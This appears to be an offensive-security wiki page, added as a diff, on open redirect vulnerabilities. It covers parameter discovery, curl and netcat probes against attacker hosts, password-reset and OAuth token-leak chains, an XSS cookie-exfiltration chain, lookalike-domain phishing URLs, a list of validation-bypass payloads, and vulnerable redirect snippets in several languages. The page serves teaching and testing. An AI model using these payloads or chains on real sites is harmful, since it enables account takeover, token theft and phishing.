@@ -1,0 +1,423 @@
+---
+title: Open Redirect
+description: When an application's redirection functionality accepts a victim-controlled URL without validation - parameter discovery patterns, the token-leak primitive where session/CSRF/reset tokens travel into attacker-controlled URLs, phishing chains, and the defenses (whitelist, mapped values, confirm page).
+mitre: [T1539, T1212]
+d3fend: [D3-IAA]
+impact: [SessionTakeover, PhishingDelivery, CredentialTheft]
+owasp: [A01]
+sidebar:
+  order: 9
+  label: Open Redirect
+---
+
+## TL;DR
+
+An open redirect is a server-side redirection (`Location:` header) controlled by attacker-supplied input without validation. Two distinct impacts: phishing (legitimate domain bounces victim to attacker domain) and *token leakage* (the request that follows the redirect carries session, CSRF, or reset tokens to the attacker). The second is the session-attack-relevant one.
+
+```
+# 1. Find the redirect parameter
+http://target/?url=...        ?redirect= ?next= ?return= ?goto= ?dest=
+                              (~20 common names - full list below)
+
+# 2. Confirm it accepts external URLs
+http://target/page?url=http://ATTACKER:1337/
+nc -nlvp 1337         # listener on attacker
+
+# 3. If POST or follow-up request contains tokens, harvest them
+#    The classic chain: password reset page redirects to attacker's URL
+#    with the reset token in the body or query string
+
+# 4. Phishing variant: send legitimate-looking URL that lands on attacker domain
+http://trusted.com/?redirect=http://trusted.com.evil.com/login
+```
+
+Success indicator: a request you didn't initiate arrives at your listener - and contains a token (session ID, CSRF token, password reset token, OAuth code) you can immediately reuse.
+
+## The vulnerability in five lines of PHP
+
+```php
+<?php
+$red = $_GET['url'];
+header("Location: " . $red);
+?>
+```
+
+The `Location` header tells the browser to navigate to whatever URL is in the response. With no validation on `$red`, the attacker controls the destination. `http://target/redirect.php?url=http://evil.com/` bounces the victim to `evil.com`.
+
+The same pattern exists in every language:
+
+| Language | Pattern |
+| --- | --- |
+| PHP | `header("Location: " . $_GET['url']);` |
+| Java (Servlet) | `response.sendRedirect(request.getParameter("url"));` |
+| .NET | `Response.Redirect(Request.QueryString["url"]);` |
+| Python (Flask) | `return redirect(request.args.get('next'))` |
+| Python (Django) | `return HttpResponseRedirect(request.GET.get('next'))` |
+| Node.js (Express) | `res.redirect(req.query.url);` |
+| Ruby (Rails) | `redirect_to params[:return_to]` |
+
+All are vulnerable in this naive form. The fix is always "validate the URL"; the typical mistake is "the URL has my domain in it somewhere, so it's fine."
+
+## Parameter discovery
+
+Common parameter names, in rough order of frequency:
+
+```
+?url=         ?redirect=        ?next=
+?return=      ?return_to=       ?returnurl=
+?redirect_uri= ?redirect_to=    ?redir=
+?goto=        ?go=              ?dest=
+?destination= ?continue=        ?forward=
+?fromurl=     ?fromuri=         ?from=
+?newurl=      ?exit=            ?exitpage=
+?out=         ?view=            ?loc=
+?location=    ?image_url=       ?host=
+?domain=      ?callback=        ?callback_url=
+```
+
+Where to look:
+
+- **Login pages** - `?next=`, `?return_to=`, common pattern: user lands on `/login?next=/protected`, after authenticating gets redirected to `/protected`. Replace `/protected` with attacker URL.
+- **Logout pages** - `?redirect=` is common ("after logout, go here")
+- **Password reset confirmation** - the reset email's link often contains `?redirect_uri=`
+- **OAuth flows** - `?redirect_uri=` is core to OAuth; misconfigured validation is a major source of OAuth attacks
+- **Click-tracking URLs** - newsletters and marketing emails wrap links in `tracker.target.com/?url=actual-destination`
+- **API webhooks** - `?callback=` parameters in API documentation
+
+```shell
+# Spider the site and grep for redirect-y parameters in URLs
+gospider -s "http://target/" -o output/ -t 10 -d 3
+grep -hoE '\?[a-z_]*=' output/*.txt | sort -u | grep -E 'url|redir|next|return|goto'
+
+# Or from Burp's Target → Site Map → search for any query parameter
+```
+
+## Detection
+
+### Manual probe
+
+For each candidate parameter, test with an external URL:
+
+```shell
+$ curl -is 'http://target/login?next=http://attacker.com/'
+HTTP/1.1 302 Found
+Location: http://attacker.com/        ← unvalidated; vulnerable
+```
+
+If the response redirects to your URL, it's exploitable. If it strips the URL, replaces with a default, or returns an error: validated. Common responses:
+
+- `Location: http://attacker.com/` → vulnerable
+- `Location: /home` → validated, attacker URL discarded
+- `Location: http://target/` → validated, attacker URL replaced
+- `400 Bad Request` → validated, request rejected
+
+### Active listener
+
+Set up a listener and trigger the redirect end-to-end:
+
+```shell
+# Listener
+$ nc -nlvp 1337
+
+# Trigger (open in a browser as the victim would)
+$ curl -L 'http://target/login?next=http://YOUR-IP:1337/'
+```
+
+The `-L` makes curl follow redirects. On your listener:
+
+```
+listening on [any] 1337 ...
+connect to [YOUR-IP] from target.com [TARGET-IP] 54322
+GET / HTTP/1.1
+Host: YOUR-IP:1337
+User-Agent: curl/7.81.0
+Accept: */*
+Referer: http://target/login?next=http://YOUR-IP:1337/
+```
+
+The Referer reveals the originating URL - useful for proving the redirect actually came from the target.
+
+## The token-leak primitive
+
+This is the operationally important variant - the redirect carries a token that you wouldn't otherwise have access to.
+
+### Scenario: password reset flow
+
+A common pattern in password reset:
+
+1. User clicks reset link in email: `http://target/reset?token=ABC123&redirect_uri=/complete.html`
+2. User enters new password on the reset form
+3. Form POSTs `token=ABC123&password=newpass&redirect_uri=/complete.html` to `/reset`
+4. After successful reset, server redirects to `redirect_uri` - the URL trusted from the *original* link
+5. The Referer header on the followup request contains the reset URL with the token
+
+If the attacker can craft the reset link, they can set `redirect_uri` to their own URL:
+
+```
+http://target/reset?token=VICTIM_TOKEN&redirect_uri=http://attacker.com/
+```
+
+The victim opens the link (thinking it's a legit reset), enters a new password, submits. The server processes the reset, redirects to `http://attacker.com/`. The attacker's server sees:
+
+```
+Referer: http://target/reset?token=VICTIM_TOKEN&...
+```
+
+The token is now visible to the attacker. They can replay the reset URL themselves, set a *different* new password, and take over the account.
+
+But waiting - the victim already used the token, hasn't it been invalidated? Yes, in well-designed reset flows. But the attacker has other tokens too:
+
+- The post-reset session cookie (now valid for the victim's account)
+- Any anti-CSRF token in the redirect-following request
+- OAuth codes in OAuth flows
+
+### Scenario: OAuth callback hijacking
+
+The OAuth flow:
+
+1. App redirects user to provider (Google, GitHub) with `redirect_uri=http://target/oauth/callback`
+2. User authorizes
+3. Provider redirects back to `redirect_uri` with `?code=AUTH_CODE`
+4. App exchanges code for access token
+
+If the provider validates `redirect_uri` loosely and the app has an open redirect on its callback path:
+
+```
+http://provider.com/auth?client_id=X&redirect_uri=http://target/oauth/callback?next=http://attacker.com/
+```
+
+Provider sends user to `http://target/oauth/callback?next=http://attacker.com/&code=AUTH_CODE`. Target's callback handler processes the code (logs the user in) *and* redirects to `next=http://attacker.com/?code=AUTH_CODE`. Attacker now has the auth code.
+
+Variants exist for every step of the OAuth chain. See OAuth-specific writeups for the full taxonomy.
+
+### Scenario: HTB-style submit-solution endpoint
+
+The HTB-style scenario: a `/submit-solution?url=...` endpoint that, when an admin "submits a solution," redirects the admin's browser to the provided URL. Combined with a stored-XSS profile, you can:
+
+1. Plant XSS in your profile that doesn't fire on your own viewing (defenders won't notice)
+2. Submit a "solution" with `url=http://your-profile-with-XSS`
+3. Admin reviews submissions; clicks through; lands on your profile; XSS fires in admin's context
+4. XSS exfils admin's session cookie
+
+This is the canonical end-to-end chain in the [Chaining Final](/codex/web/sessions/chaining-final/) walkthrough.
+
+## Phishing chains
+
+The non-token use case: an open redirect on a trusted domain makes phishing links look legitimate:
+
+```
+Phishing email:
+"Click here to verify your bank account: http://trusted-bank.com/verify?next=http://trusted-bank.com.evil.com/login"
+```
+
+Many email-security tools and humans evaluate the URL's domain at a glance. `http://trusted-bank.com/...` looks legitimate; the `?next=` parameter is overlooked. After the click, the redirect bounces to `trusted-bank.com.evil.com` which looks similar enough to confuse the victim.
+
+This is why open redirect is taken seriously even when there's no obvious token at risk - the attack surface is "victim trust in URL inspection," which is wide.
+
+### URL obfuscation tricks
+
+To make the malicious URL less visible:
+
+```
+http://trusted.com/?next=http%3A%2F%2Fevil.com%2F      ← URL-encoded
+http://trusted.com/?next=//evil.com/                   ← protocol-relative
+http://trusted.com/?next=https:evil.com                ← whitespace in middle
+http://trusted.com/?next=javascript:alert(1)           ← javascript: scheme (DOM-based effect)
+http://trusted.com/?next=data:text/html,<script>...    ← data: URI
+http://trusted.com/?next=/\\evil.com/                  ← backslash, some parsers OK
+http://trusted.com/?next=//evil%E3%80%82com            ← Unicode lookalike for "."
+```
+
+Each tests a different validation gap:
+
+| Trick | Bypasses |
+| --- | --- |
+| URL encoding | Validation that runs before URL-decoding |
+| `//evil.com` | Validation that only blocks `http://` and `https://` |
+| `https:evil.com` | Parsers that interpret loosely |
+| `javascript:` | Some apps allow data/javascript schemes |
+| `data:` URI | Same |
+| Backslash | Some parsers treat `\` as `/` |
+| Unicode lookalikes | Validation comparing exact strings |
+
+## Validation bypasses
+
+Common validations and their bypasses:
+
+### "Starts with our domain"
+
+```python
+if url.startswith('http://target.com'):
+    redirect(url)
+```
+
+Bypass:
+
+- `http://target.com.evil.com/` - starts with `http://target.com` (note the dot)
+- `http://target.com@evil.com/` - the `@` makes target.com the userinfo, evil.com the host
+
+### "Contains our domain"
+
+```python
+if 'target.com' in url:
+    redirect(url)
+```
+
+Bypass: any URL with `target.com` in the path / query:
+
+- `http://evil.com/?fake=target.com`
+- `http://target.com.evil.com/`
+- `http://eviltarget.com/`
+
+### "Domain matches a regex"
+
+```python
+if re.match(r'^https?://target\.com', url):
+    redirect(url)
+```
+
+The regex anchors `^` (start) but not `$` (end), so:
+
+- `http://target.com.evil.com/` matches (the regex matches the first 18 chars)
+
+If the regex has `$`:
+
+```python
+if re.match(r'^https?://target\.com$', url):
+    redirect(url)
+```
+
+Then the URL has to be exactly `http://target.com` - no path, no query - which is rarely useful and forces the developer to use a less strict regex.
+
+### "Has a trusted domain in the host"
+
+```python
+host = urlparse(url).hostname
+if host in ALLOWED_HOSTS:
+    redirect(url)
+```
+
+Bypass via:
+
+- Subdomain takeover on an allowed host (you control a subdomain registered as allowed)
+- Open redirect on an allowed host - chain redirects through `target.com → trusted.com → evil.com`
+
+### "Strip the protocol, check the path"
+
+```python
+# Bad - assumes URL is relative
+if url.startswith('/'):
+    redirect(url)
+```
+
+Bypass: protocol-relative URLs that start with `/`:
+
+```
+http://target/redirect?url=//evil.com/
+```
+
+The redirect destination is `//evil.com/` which the browser interprets as `http://evil.com/` (protocol-relative).
+
+### Whitelisted-prefix bypass
+
+```python
+ALLOWED_PREFIXES = ['/account', '/dashboard']
+if any(url.startswith(p) for p in ALLOWED_PREFIXES):
+    redirect(url)
+```
+
+Bypass:
+
+- `/account@evil.com/` - starts with `/account` but is parsed as URL with user `account` and host `evil.com`
+- `/account/../../../../evil.com` - combined with path-traversal-tolerant downstream code
+
+## Worked open-redirect chain
+
+The HTB scenario: `oredirect.htb.net` redirects after entering an email. The flow:
+
+1. Visit `http://oredirect.htb.net/?redirect_uri=/complete.html&token=ABC123`
+2. Enter email → POST to `/complete.html` with `token=ABC123` and form data
+3. After POST, server redirects to `redirect_uri` value
+
+The vulnerability: `redirect_uri` is the user-controllable destination.
+
+Attack:
+
+```shell
+# 1. Set up listener
+$ nc -lvnp 1337
+listening on [any] 1337 ...
+
+# 2. Set the redirect URI to attacker URL - craft this link:
+#    http://oredirect.htb.net/?redirect_uri=http://YOUR-IP:1337&token=ABC123
+
+# 3. Send to victim (or in test scenario, browse it yourself in a private window)
+#    Victim enters email, submits → POST → redirect chain
+```
+
+On the listener:
+
+```
+connect to [YOUR-IP] from oredirect.htb.net 54322
+POST / HTTP/1.1
+Host: YOUR-IP:1337
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+...
+
+email=victim@example.com&token=ABC123
+```
+
+The listener catches *the full POST* - including the `token`. The redirect causes the browser to re-issue the POST to the new URL. (Browsers handle 307/308 redirects this way; for 301/302 GET-after-POST is the default, but some apps respond with 307.)
+
+Even if the redirect is a GET (302), the token may still be in the URL or Referer:
+
+```
+GET /?token=ABC123 HTTP/1.1
+Referer: http://oredirect.htb.net/?redirect_uri=http://YOUR-IP:1337&token=ABC123
+```
+
+Either way, the token is now in the attacker's logs.
+
+## Defenses
+
+For the operator's purposes, knowing the defenses tells you what to test:
+
+| Defense | Bypass to try |
+| --- | --- |
+| Whitelist of exact destinations | Find a destination on the whitelist that itself has an open redirect |
+| Mapped values (`?dest=1` → URL from lookup table) | Look for the lookup file/DB to leak more entries |
+| Confirm-redirect page | Bypass if the confirm step has its own redirect parameter, or if the page can be skipped via direct URL |
+| Origin/Referer check | Strip Referer (via `<meta name="referrer" content="no-referrer">`) |
+| Requires authenticated session | Combine with a forced auth attack |
+| HSTS / Strict-Transport-Security | Doesn't prevent open redirect (protocol-level defense, redirect is application-level) |
+
+The confirm-redirect page is interesting - it's effective UX-wise (user sees the destination before navigating) but only if the page itself can't be skipped. Apps that use it sometimes have a "direct redirect" path for trusted referrers; that path is often less defended.
+
+## When the redirect status code matters
+
+- **301 Moved Permanently** - browsers may cache aggressively; first redirect is the only one tested
+- **302 Found** - temporary; browsers don't cache; method downgrade (POST → GET) on redirect
+- **303 See Other** - like 302 but explicit about method downgrade
+- **307 Temporary Redirect** - keeps the method (POST stays POST); this is the dangerous one for token leakage
+- **308 Permanent Redirect** - like 307 but cached
+
+For maximum token leak surface, you want the server to issue 307 or 308 - these preserve POST bodies across the redirect.
+
+## Quick reference
+
+| Task | Pattern |
+| --- | --- |
+| Common parameter names | `?url=`, `?next=`, `?redirect=`, `?return=`, `?goto=`, `?dest=`, `?redirect_uri=` |
+| Test for external redirect | `curl -is 'http://target/?url=http://attacker.com'` |
+| Confirm via listener | `nc -nlvp 1337` and use that URL as the redirect target |
+| Capture redirect Referer | Listener prints `Referer:` header in incoming requests |
+| Bypass startsWith check | `http://target.com.evil.com/`; `http://target.com@evil.com/` |
+| Bypass contains check | `http://evil.com/?fake=target.com` |
+| Bypass `//` prefix | `//evil.com/` (protocol-relative) |
+| Bypass with encoded | `%2f%2fevil.com%2f` |
+| Bypass via subdomain | Take over a dangling subdomain in the whitelist |
+| Token-leak post-reset | Set reset's `redirect_uri` to attacker; capture token in Referer |
+| OAuth callback hijack | Set `redirect_uri` to target's open redirect → attacker |
+| Phishing payload | `http://trusted.com/?next=http://trusted.com.evil.com/login` |
+| Preserve POST across redirect | Need 307/308 response - test by issuing POST + `Location:` |
